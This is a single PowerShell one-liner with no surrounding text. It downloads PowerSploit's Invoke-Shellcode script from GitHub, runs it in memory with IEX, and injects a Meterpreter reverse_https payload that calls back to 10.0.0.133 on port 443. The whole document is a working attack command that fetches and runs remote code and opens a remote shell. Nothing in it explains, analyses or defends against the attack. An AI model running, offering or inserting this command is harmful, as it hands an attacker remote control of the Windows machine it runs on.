
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.133 -Lport 443 -Force

